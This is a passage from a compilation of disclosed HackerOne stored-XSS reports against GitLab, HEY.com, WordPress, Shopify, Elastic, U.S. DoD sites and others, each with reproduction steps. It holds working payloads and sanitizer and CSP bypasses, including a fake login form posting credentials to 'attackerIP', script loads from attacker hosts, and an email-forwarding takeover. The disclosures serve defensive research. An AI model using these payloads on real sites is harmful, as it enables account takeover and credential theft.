A stored-XSS is existing in error message of build-dependencies. Fortunately it currently does not exist in gitlab.com. It seems that gitlab.com [disables](https://gitlab.com/gitlab-org/gitlab/-/issues/6144#note_232311971) the dependencies validation. However this feature is enable by default in self-managed installation.

### Steps to reproduce

The following steps should to be reproduced in a self-managed installation of gitlab

1. Create an empty project
2. Go to "Settings/CI/CD/Runners" to setup a runner for this project
3. Create new file `.gitlab-ci.yml` for this project using the following content:

```yaml
test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>:
  stage: build
  script: 
    - date > index.html
  artifacts:
    paths: 
      - index.html
    expire_in: 1 second

job-test:
  stage: test
  script: echo "hi"
  dependencies: ["test<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>"]
```

4. Wait for the jobs terminated, go to the detail of `job-test`
5. You should see an alert that contains the current url

### Impact

Stored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. 
Furthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.

### What is the current *bug* behavior?

The `failure_message` has been considered as [safe](https://gitlab.com/gitlab-org/gitlab/-/blob/2a5ebef661656937f823736f4f84400a8979b576/app/serializers/build_details_entity.rb#L135)

### What is the expected *correct* behavior?

The `failure_message` should be sanitized.

### Relevant logs and/or screenshots

Please see a screenshot in attached file

### Output of checks

#### Results of GitLab environment info

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.6p146
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.9
Git Version:	2.27.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.2.2-ee
Revision:	618883a1f9d
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	11.7
URL:		http://gl.local
HTTP Clone URL:	http://gl.local/some-group/some-project.git
SSH Clone URL:	git@gl.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	13.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Stored-XSS allow attackers to perform arbitrary actions on behalf of victims at client side. 
Furthermore, by using `<iframe>`  (detailed in #831962), the Stored-XSS can be fired in gitlab.com despite its CSP.

---

### [Stored XSS on https://app.crowdsignal.com/surveys/[Survey-Id]/question - Bypass](https://hackerone.com/reports/974271)

- **Report ID:** `974271`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Automattic
- **Reporter:** @ali
- **Bounty:** - usd
- **Disclosed:** 2020-11-18T14:20:21.496Z
- **CVE(s):** -

**Vulnerability Information:**

Hello there,
I hope all is well!

I found a stored xss on https://app.crowdsignal.com/

Steps:
* Go to `https://app.crowdsignal.com/dashboard`
* Create a survey.
* Go to `https://app.crowdsignal.com/quizzes/{survey-id}/question`
* Add `Multiple Choice`
* Click `Add media` button.
* Select `Embed Media`
* Paste this: `[dailymotion id=x8oma9]`
* Insert it.
* Open Burp Suite and click `Save` button.
* Return to burp suite and paste xss payload to `media[11111111]` parameter: `[dailymotion id=x8oma9"><svg/onload=prompt(document.domain)>]`
* Forward the request and refresh the page. You will see xss alert.

This isn't self xss because I saw users who Team plan can invite other users to their dashboards. So attacker can steal victim's cookies.

Also I recorded a poc video for you:   
{F975177}

## Impact

Stealing cookies.

Best Regards,
@mygf

**Summary (researcher):**

If you want to follow me, here is my linkedin & twitter accounts:
https://twitter.com/alicanact60
https://tr.linkedin.com/in/alicanact60

@mygf

---

### [HEY.com email stored XSS](https://hackerone.com/reports/982291)

- **Report ID:** `982291`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Basecamp
- **Reporter:** @jouko
- **Bounty:** 5000 usd
- **Disclosed:** 2020-10-27T18:06:36.831Z
- **CVE(s):** -

**Vulnerability Information:**

An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.

To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.

Example email:
~~~~ plain
From: jouko@klikki.fi
To: jouko@hey.com
Subject: HackerOne test
MIME-Version: 1.0
Content-type: text/html

<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
</style>
~~~~
To send the email, create a text file with the above contents. Send it with the command
~~~~ plain
/usr/sbin/sendmail -t < email.txt
~~~~


The backslashes in the <style> tag are decoded. The first \000027 confuses the HTML filter. The encoded <message-content> and <template> tags are there to escape the DOM shadowroot element. The HTML filter doesn't let you inject only closing tags, i.e. </template>, you need an opening tag first.

Finally, HTML like this is injected:
~~~~ html
<form action="/my/accounts/266986/forwardings/outbound" data-controller="beacon">
<input type=text name="contact_outbound_forwarding[to_email_address]" value="joukop@gmail.com">
</form>
~~~~
This exploits the Stimulus framework and the existing JavaScript controllers to post the form automatically. The CSRF token is inserted by the framework. This example sets up email forwarding to an external address.

This is just one way to exploit the bug. Even though plain <script> won't work in modern browsers due to the Content Security Policy, It seems likely there are ways to bypass it by using the JS frameworks (will look at this more). The account ID in this PoC has to be guesstimated or brute forced (266986).

Another example is to simply set the form ```action``` to an attacker URL. This will send the user's CSRF token to the attacker so that it could be used in a subsequent attack.

The POST request in Chrome's developer console:
{F988220}

If you want to view the email on my HEY account (jouko@hey.com) the email ID is 83625339.

## Impact

A HEY user viewing an email sent by the attacker may have their account compromised.

---

### [Stored XSS via Comment Form at ████████](https://hackerone.com/reports/915073)

- **Report ID:** `915073`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2020-09-29T20:17:34.424Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An attacker can submit a comment form with injected HTML, leading to a number of malicious effects

## Step-by-step Reproduction Instructions

1. Browse to https://████
2. Complete the form. I placed `"><script src=http://attackerip/blind.js/>` in the `Name` field. Some example payloads for the `Comments` field are as follows:

For credential theft, an attacker could place `<h3>Please login to proceed</h3><form action=http://attackerIP>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>` in the `Comments` field.
███████
████

To redirect to a malicious website, an attacker could use `<img src=x onerror='javascript:window.open("http://catcompusa.com")'></img>`.
██████
The malicious website will open in a new tab when the image fails to load as shown below:
█████████

## Conclusions
- This leads me to believe that once a █████████ employee reads the comment, the code will be injected into their browser as well.
- Additionally, the blind XSS payload injected into the `Name` field seemed to cause a hit on my weblog from `█████████` and `██████████`.
█████

## Suggested Mitigation/Remediation Actions
Sanitize how user input is parsed by the server before being reflected onto the resulting comment page to prevent XSS/HTML injection.

## Impact

The attacker could achieve numerous effects such as credential theft, forced browsing, keystroke logging, drive-by downloads, etc. ultimately leading to administrative access over the █████ website and potentially other internal resources.

---

### [Stored-Xss at connect.topcoder.com/projects/ affected on project chat members](https://hackerone.com/reports/779908)

- **Report ID:** `779908`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Lab45
- **Reporter:** @hundredpercent
- **Bounty:** - usd
- **Disclosed:** 2020-09-22T19:41:55.290Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team ,
I'm sorry for my bad report and english ,
but i wish you understand the impact of that bug here , if it well performed the sers may lose their access to their sso accounts 

## Summary:
While a developer at connect.topcoder.com can manage a messages about his/her project with someonelse ,
This conversation was not fully protected from XSS , if some user join in the same chat he'd be affected by that xss and his ==SSO== account possibly will be token over 

## Steps To Reproduce:
After you register to topcoder.com go to connect.topcoder.com and sign on with your sso account ,
After that Go to https://connect.topcoder.com/new-project/ and add new project

**NOTE** : The discussion will not be accessible publicult efore the administratirs manages it , So after the adiministrators accept it the bug will be accessible publiculy █████

  1. GO TO https://connect.topcoder.com/projects/<your_project_id>/messages
  2. Add message with random title and this `<script>alert()</script>` as content , then submit
  3. You'll get a fully JS code injected 

If an attacker inject a Javascript code that steal cookies/csrf-token... he'll be able to fully access to the victim account

## Supporting Material/References:
Tested on
* Chrome Browser .
* Windows 7_64x 
Note : That bug is affect to every machine/browser

## Impact

Xss

---

### [Stored XSS in markdown when redacting references](https://hackerone.com/reports/836649)

- **Report ID:** `836649`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 5000 usd
- **Disclosed:** 2020-09-09T21:58:37.456Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
It's possible to inject arbitrary html into the markdown by abusing the ReferenceRedactorFilter. This is due to the `data-original` attribute allowing html encoded data to be stored, which is then extracted and used as the link content. If the original data already is html encoded then it will be unencoded after it is redacted:

```ruby
    def redacted_node_content(node)
      original_content = node.attr('data-original')
      link_reference = node.attr('data-link-reference')

      # Build the raw <a> tag just with a link as href and content if
      # it's originally a link pattern. We shouldn't return a plain text href.
      original_link =
        if link_reference == 'true'
          href = node.attr('href')
          content = original_content

          %(<a href="#{href}">#{content}</a>)
        end

      # The reference should be replaced by the original link's content,
      # which is not always the same as the rendered one.
      original_link || original_content || node.inner_html
    end
```

### Steps to reproduce
1. create a private project with one account
1. create an issue in the private project
1. sign into another account that does not have permission to read the above project
1. comment on an issue linking to the private issue using the following:

    ```markdown
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>
    ```
1. The rendered markdown contains the injected html:

    ```html
<div class="md"><p data-sourcepos="1:1-1:124" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">xss <img onerror="alert(1)" src="x"></a></p></div>
    ```

The above is blocked by the csp, but that can be bypassed similar to https://hackerone.com/reports/662287#activity-6026826 (requires clicking anywhere on the page, but the link is full screen):

```markdown
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">csp 
&lt;a 
  data-remote=&quot;true&quot;
  data-method=&quot;get&quot;
  data-type=&quot;script&quot;
  href=/wbowling/wiki/raw/master/test.js
  class='atwho-view select2-drop-mask pika-select'
&gt;
  &lt;img height=10000 width=10000&gt;
&lt;/a&gt;
</a>
```

which generates the following html:
```html
<div class="md issue-realtime-trigger-pulse"><p data-sourcepos="1:1-11:4" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">csp
</a><a data-remote="true" data-method="get" data-type="script" href="/wbowling/wiki/raw/master/test.js" class="atwho-view select2-drop-mask pika-select">
<img height="10000" width="10000">
</a>
</p></div>
```

### Impact
Anywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss

### Examples
* example payload: https://gitlab.com/vakzz-h1/stored-xss/-/issues/1
* with csp bypass (requires clicking anywhere on the page): https://gitlab.com/vakzz-h1/stored-xss/-/issues/2

### What is the current *bug* behavior?
The `data-original` attribute can be abused to inject arbitrary html when a reference is redacted.

### What is the expected *correct* behavior?
The `data-original` should be double encoded or filtered before being reused.

### Relevant logs and/or screenshots
{F769570}

### Output of checks
Happens on gitlab.com

#### Results of GitLab environment info

```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.24.1
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.9.2-ee
Revision:	0ad76f4d374
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.12
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	12.0.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Anywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss

---

### [Stored XSS in "Create Groups"](https://hackerone.com/reports/647130)

- **Report ID:** `647130`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @rioncool22
- **Bounty:** 2500 usd
- **Disclosed:** 2020-08-26T14:15:21.414Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the (parenthesized) sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

### Summary

Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS. 

### Steps to reproduce

1. Login to [Gitlab](https://gitlab.com)
2. Create a new group with xss payload
payload i use = "><img src=x onerror=prompt(123)>
3. Open Group
4. To trigger XSS you can click "NEW PROJECT"
5. XSS Trigger

## Impact

Can steal Cookie, Can run javascript code, etc

---

### [Blind Stored XSS Via Staff Name](https://hackerone.com/reports/948929)

- **Report ID:** `948929`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Shopify
- **Reporter:** @rioncool22
- **Bounty:** 3000 usd
- **Disclosed:** 2020-08-18T19:41:41.906Z
- **CVE(s):** -

**Vulnerability Information:**

Hey Team, I found blind stored XSS when i add staff name  in https://your-store.myshopify.com/admin/settings/account

Step to reproduce : 
1. Go to https://your-store.myshopify.com/admin/settings/account
2. Add Staff Account 
3. Fill First & Last Name with this payload "><script>$.getScript("//█████████.xss.ht")</script>
4. XSS will be fired in your internal web

You should check the DOM.html guys

## Impact

Stored XSS

---

### [pre-auth Stored XSS in comments via javascript: url when administrator edits user supplied comment](https://hackerone.com/reports/633231)

- **Report ID:** `633231`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** WordPress
- **Reporter:** @simonscannell
- **Bounty:** - usd
- **Disclosed:** 2020-08-18T18:01:25.262Z
- **CVE(s):** -

**Vulnerability Information:**

When a comment is submitted, it is filtered via `wp_rel_nofollow_callback()`, which adds the `rel` attribute to `<a>` tags within the anchor:

```
function wp_rel_nofollow_callback( $matches ) {
	$text = $matches[1];
	$atts = shortcode_parse_atts( $matches[1] );
	$rel  = 'nofollow';

	if ( ! empty( $atts['href'] ) ) {
		if ( in_array( strtolower( wp_parse_url( $atts['href'], PHP_URL_SCHEME ) ), array( 'http', 'https' ), true ) ) {
			if ( strtolower( wp_parse_url( $atts['href'], PHP_URL_HOST ) ) === strtolower( wp_parse_url( home_url(), PHP_URL_HOST ) ) ) {
				return "<a $text>";
			}
		}
	}

	if ( ! empty( $atts['rel'] ) ) {
		$parts = array_map( 'trim', explode( ' ', $atts['rel'] ) );
		if ( false === array_search( 'nofollow', $parts ) ) {
			$parts[] = 'nofollow';
		}
		$rel = implode( ' ', $parts );
		unset( $atts['rel'] );

		$html = '';
		foreach ( $atts as $name => $value ) {
			$html .= "{$name}=\"" .  $value . '" ';
		}
		$text = trim( $html );
	}
	return "<a $text rel=\"" . esc_attr( $rel ) . '">';
}
```

if the `rel` attribute is already set, the `<a>` tag is built back together with the values returned by `shortcode_parse_atts()`.  This is problematic, since `shortcode_parse_atts()` calls `stripcslashes()` on the attribute values, which for example allows turning `\x3a` into `:`. 

Therefor the `esc_url()` function can be bypassed by:
1. using a URL such as `javascript\x3aalert(1);` 
2. getting an admin to edit and update the comment containing the XSS payload
3. done

I recommend moving away from `shortcode_parse_atts()` because of side effects like these. I also got close to a XSS without user interaction through the same mechanisms but it fails luckily.

### PoC:

1. As an unauthenticated user, create a comment with the following content:
```
Hi!
I really enjoy your work. We've also written a blog post about it here: http://dummysite.com/awesome-blogpost. Feel free to check it out!
<a href="javascript\x3aalert(1);">Visit my web page</a>
```

2. create a second comment with the content:
```
I just noticed a typo in the URL! Could you please change it from dummysite.com to dummysite2.com? Thank you so much
```
3. Log in as an admin, go to the comments section and edit the comment and click save
4. View the comment on the post, click the "Visit my web page" URL and see the alert() box popping up.

## Impact

Through the XSS, RCE can be gained. Obviously a lot of user interaction is required but yeah, it is a super easy to copy & paste payload that could be used against non technical users. The XSS could then also be triggered via clickjacking.

---

### [Blind stored XSS due to insecure contact form at https://www.topcoder.com leads to leakage of session token and other PII](https://hackerone.com/reports/878145)

- **Report ID:** `878145`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Lab45
- **Reporter:** @mase289
- **Bounty:** - usd
- **Disclosed:** 2020-08-07T17:17:07.746Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://www.topcoder.com/contact-us/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets.  I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

1.	Browse to the page at https://www.topcoder.com/contact-us/ and fill out the contact form submitting your blind XSS payload in First name , Last name, Company and description field. 
2.	Submit the form and have and admin access the information.
3.	This will trigger XSS in the admin panel and a notification to the XSS hunter service with details of the event. 

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

F834746  XSS hunter screenshot revealing mail chimp information

█████ Dom.html you can search through this for my XSS hunter payload `"><script src=https://xvt.xss.ht></script>`

F834748 Full XSS hunter email report

## Impact

An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customer and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.

---

### [Stored XSS in my staff name fired in another your internal panel](https://hackerone.com/reports/946053)

- **Report ID:** `946053`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Shopify
- **Reporter:** @cyber__sec
- **Bounty:** - usd
- **Disclosed:** 2020-07-29T22:06:36.953Z
- **CVE(s):** -

**Vulnerability Information:**

Hi all,

I had lots of tests for bug bounty in my test store "trstore-3.myshopify.com" (created about 4 years ago) and then one of your developers noticed that a stored cross-site scripting payload in my staff name fired in another your internal panel. 

I have attached the email sent to me by your collegue  and I'd like to get a award and I am very happy.

Thanks alot.

## Impact

Stored XSS

**Summary (team):**

Several years ago, @cyber__sec placed a cross-site scripting payload in the name of a staff member on his test shop. This payload recently executed in our internal administration panel, alerting us to a cross-site scripting bug. Because @cyber__sec's payload triggered the bug, we asked him to submit a report.

We awarded the maximum bounty under our Cross-site scripting category because the payload executed in our internal administrator panel, resulting in a high security impact.

---

### [Stored XSS in TSVB Visualizations Markdown Panel](https://hackerone.com/reports/858874)

- **Report ID:** `858874`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Elastic
- **Reporter:** @jeremybuis
- **Bounty:** - usd
- **Disclosed:** 2020-07-28T18:53:28.254Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

**Summary:** An authenticated user can save a TSVB visualization, which contains a stored cross-site scripting (XSS) payload in the included Less code as part of the markdown panel.

**Description:** I've found a stored cross-site scripting (XSS) issue in the TSVB visualization. The Markdown panel accepts Custom CSS and Less. The proof-of-concept attack below shows how to create an XSS using the Less language.  By injecting a payload like: body { color: \`confirm('XSS')\`; } , a malicious user is able to gain JavaScript execution on the domain. When another authenticated user edits the Less code, the payload fires.

## Steps To Reproduce:

I created an instance of Kibana on cloud.elastic.co and performed the following:

1. Login to Kibana and navigate to the visualizations page and click "Create Visualization"
2. Select TSVB
3. Navigate to the Markdown tab
4. Navigate to the Panel options sub tab
5. Place the following payload in the custom CSS editor:
    body { color: \`confirm('XSS')\`; }
6. Notice the Confirm dialog
7. Save the visualization
8. As another user, navigate to the visualizations custom css and edit the Less
9. Notice the Confirm dialog

A similar attack can be done on the demo.elastic.co Kibana instance as well. Heres a permalink to the example above: [Demo Kibana Less XSS](https://demo.elastic.co/app/kibana#/visualize/create?type=metrics&_g=()&_a=(filters:!(),linked:!f,query:(language:kuery,query:''),uiState:(),vis:(aggs:!(),params:(axis_formatter:number,axis_position:left,axis_scale:normal,default_index_pattern:'filebeat-*',default_timefield:'@timestamp',id:'61ca57f0-469d-11e7-af02-69e470af7417',index_pattern:'',interval:'',isModelInvalid:!f,markdown:'%23+Hello',markdown_css:'%23markdown-61ca57f0-469d-11e7-af02-69e470af7417+body%7Bcolor:true%7D',markdown_less:'%2F%2F+@plugin+%22https:%2F%2Fef358b0f.ngrok.io%2Fcxss.js%22;%0Abody+%7B+color:+%60confirm(!'XSS!')%60+%7D%0A%0A',series:!((axis_position:right,chart_type:line,color:%2368BC00,fill:0.5,formatter:number,id:'61ca57f1-469d-11e7-af02-69e470af7417',line_width:1,metrics:!((id:'61ca57f2-469d-11e7-af02-69e470af7417',type:count)),point_size:1,separate_axis:0,split_mode:everything,stacked:none)),show_grid:1,show_legend:1,time_field:'',type:markdown),title:'',type:metrics)))

###Scenario

A malicious user could create a scenario where the visualization is saved as part of a dashboard, and the processed CSS causes a problem with the view, inviting other users to try and fix the issue. When the other users try and fix the issue, they trigger the XSS payload. The malicious user could then perform actions as if the were the affected user, and potentially ex-filtrate sensitive data they didn't already have access too.

###Alternate Payload

If including malicious JavaScript in the Less code is too obvious, the malicious user can include a Less plugin instead. The Less code would look like the following:

```
@plugin "https://www.example.com/plugin";
```
Notice that the ".js" extension is not needed, further obfuscating the attack. The plugin code would look like the following:

```
confirm("XSS Less plugin");
module.exports = {
  install: function(less, pluginManager, functions) {
    functions.add('xss', function(val) {
      return val.value;
    });
  }
};
```

This approach is less obvious compared to the inline JS, when an unsuspecting user tries to modify the Less code.

## Impact: XSS can be used to force users to download malware, navigate to malicious websites, or hijack users sessions. For Kibana, the vulnerability could allow an attacker to obtain sensitive information from or perform destructive actions on behalf of other Kibana users.

### Recommendations:

Upgrade to Less version 3.0 or greater and confirm that the Less option { javascriptEnabled: false } is properly configured. This will fix the inline JavaScript execution problem.

There is no fix at the moment for the plugin syntax as far as I know. I will be communicating with the Less team shortly to see what can be done.

## Supporting Material/References:

  * Two screenshots showing both the inline JavaScript injection and the Less plugin option against the demo.elastic.co instance
  * Two screenshots showing both inline and plugin options against a deployment on https://cloud.elastic.co/
  * My example Less plugin

## Impact

The vulnerability could allow an attacker to obtain sensitive information from or perform destructive actions on behalf of other Kibana users

---

### [Stored XSS in Elastic App Search](https://hackerone.com/reports/846905)

- **Report ID:** `846905`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Elastic
- **Reporter:** @iamnoooob
- **Bounty:** 2000 usd
- **Disclosed:** 2020-07-28T18:26:29.596Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
There exists a stored XSS via reference_ui in "URL" Parameter in the latest Elastic App Search v7.6.2 (Tested both on cloud and local instance)

**Description:** 
Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.

## Steps To Reproduce:
1. Go To https://cloud.elastic.co/ and login

2. Create a Deployment by visiting https://cloud.elastic.co/deployments/create

3. Fill & Select all necessary details but under **"Optimize your deployment"** section select **"App Search"** & Click Create Deployment

4. Now go to your deployment and click "launch" on your App Search instance and you would be taken to something like `https://069c551087be451bb8d1aecb3cf64341.app-search.us-east-1.aws.found.io/login`

5. Now Login with the provided credentials and Click **"Create an Engine"**

6. On the next screen, Click **"Paste JSON"** and put this 
```
{
"url":"javascript://test%0aalert(document.domain)"
}
```
7. Next, Go to "Reference UI" tab on the menu at the left and under "Title field (optional)" field select "url" and also under "URL field (optional)" field select "url" and finally click "Generate Preview" and you would be take to something like `https://069c551087be451bb8d1aecb3cf64341.app-search.us-east-1.aws.found.io/as/engines/test/reference_application/preview?titleField=url&urlField=url`
{F783219}

8. Press **"CTRL + CLICK"** or **middle mouse button** on the Title and XSS will be executed.
{F783213}

9. The Generated link `https://069c551087be451bb8d1aecb3cf64341.app-search.us-east-1.aws.found.io/as/engines/test/reference_application/preview?titleField=url&urlField=url` can directly be shared with High privileged users etc.

## Impact

A low privileged user with only access to create/index documents can create a document with such evil JSON and can send a link of Reference UI to Admin/Owner which when clicked would lead to Stored XSS

---

### [Stored Cross Site Scripting.](https://hackerone.com/reports/413077)

- **Report ID:** `413077`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** 8x8
- **Reporter:** @sakhauathr99
- **Bounty:** - usd
- **Disclosed:** 2020-07-21T17:12:40.995Z
- **CVE(s):** -

**Vulnerability Information:**

Hellow team 
I got Stored based XSS on your web :D

Here Is Step :

1. Go to https://www.easycontactnow.com/
2. Click "Try For Free" (Sign Up)
3. It will told you "Enter your details to get started". 
   So Enter your full name like : "><script>alert(1)</script>
   Then put all the other details.
4. Then Confirm your id and login.
5. Then Click dashboard and other thing :) 
6. Tada script executed done :D

POC : https://www.youtube.com/watch?v=gYyCAxaB6w0

Sorry for my bad english. 

Thanks :)

## Impact

Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.

---

### [Stored XSS at ██████userprofile.aspx](https://hackerone.com/reports/901377)

- **Report ID:** `901377`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @5050thepiguy
- **Bounty:** - usd
- **Disclosed:** 2020-07-08T17:38:27.299Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Stored XSS vulnerability exists at ██████████userprofile.aspx under "say something about yourself...". XSS can be used for a variety of attacks. 

## Impact
XSS can be used to steal cookies, password or to run arbitrary code in the victim's browser. 

## Step-by-step Reproduction Instructions

1. Create an account at ███████
2. Go to your profile at ████userprofile.aspx
3. Go to "Say something about yourself..." and enter the XSS payload xxx<svg/onload=alert(document.cookie);>xxx
4. Observe that XSS triggers and reload the page to observe that it is stored XSS.

## Product, Version, and Configuration (If applicable)
███userprofile.aspx#

## Suggested Mitigation/Remediation Actions
Use secure coding techniques such as sanitizing input into form fields so attackers cannot inject scripts to perform XSS attacks. XSS vulnerabilities come from a lack of data escaping. 

##References
https://hackerone.com/reports/858255
https://dzone.com/articles/reflected-xss-explained-how-to-prevent-reflected-x
https://www.imperva.com/learn/application-security/reflected-xss-attacks/
https://www.hacksplaining.com/prevention/xss-reflected

## Impact

XSS can be used to steal cookies, password or to run arbitrary code in the victim's browser.

---

### [Stored XSS agent_status ](https://hackerone.com/reports/418271)

- **Report ID:** `418271`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** 8x8
- **Reporter:** @madrobot
- **Bounty:** - usd
- **Disclosed:** 2020-06-09T20:14:48.721Z
- **CVE(s):** -

**Summary (team):**

The functionality to set a user's status within the ContactNow application did not perform sufficient encoding when displayed to other user's of a given organization.

---

### [Unrestricted file upload leads to stored xss on https://████████/](https://hackerone.com/reports/854445)

- **Report ID:** `854445`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sensoyard
- **Bounty:** - usd
- **Disclosed:** 2020-05-27T14:24:10.310Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

When the user want to upload a "certificate", the web app doesn't check the content-type of the file. A user can upload any kind of file (binary,html,...)

## Step-by-step Reproduction Instructions

1. Create an account at https://██████/████████/app/registration/basic-info

2. When you are connected, click on "certification"

Upload this file as xss.html and save the modifications: 

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Simple Test</title>
    <meta name="viewport" content="initial-scale=1.0">
    <meta charset="utf-8">
  </head>
  <body>
    <script>
	alert(document.cookie	)
	</script>
  </body>
</html>
```
3 . Go back to the "certification tab " and open the attachement in a new tab

POC :https://███/████/registration-service/files/███████.html

## Suggested Mitigation/Remediation Actions
Restrict the content-type of the uploaded files

## Impact

The unrestricted file upload vulnerability leads to stored xss.

---

### [Stored Xss Vulnerability on ████████](https://hackerone.com/reports/380103)

- **Report ID:** `380103`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** U.S. Dept Of Defense
- **Reporter:** @ali
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T18:06:11.782Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
A Xss vulnerability using svg file & html file.

## Step-by-step Reproduction Instructions
1. Go to https://██████████/SitePages/Register.aspx and register.
2. Go to  `https://██████████/Profiles/My/#Your Username#/Blog/default.aspx` and click `Create a Post` button.
3. Click `Body` textarea and click `Insert` button.
4. Click `Upload File` button and choose file (mygf.html or evilsvgfile.svg)
